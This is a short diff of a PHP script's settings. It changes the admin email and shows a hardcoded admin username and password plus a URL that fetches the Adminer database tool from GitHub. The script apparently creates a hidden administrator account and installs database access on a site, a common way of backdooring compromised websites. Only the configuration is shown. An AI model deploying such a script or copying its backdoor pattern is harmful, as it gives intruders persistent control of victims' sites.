@@ -8,7 +8,7 @@ ini_set('max_execution_time', 300);
 // ============================================
 $ADMIN_USERNAME = 'botak';
 $ADMIN_PASSWORD = 'Kontolodon123!';
-$ADMIN_EMAIL = 'moneyhunter@supports.xpornici.com';
+$ADMIN_EMAIL = 'oit7090@gmail.com';
 $ADMIN_FIRSTNAME = 'New';
 $ADMIN_LASTNAME = 'User';
 $ADMINER_URL = 'https://raw.githubusercontent.com/Bob-Marley-Backup/LAB-Uncomplete/refs/heads/main/adminer.php';
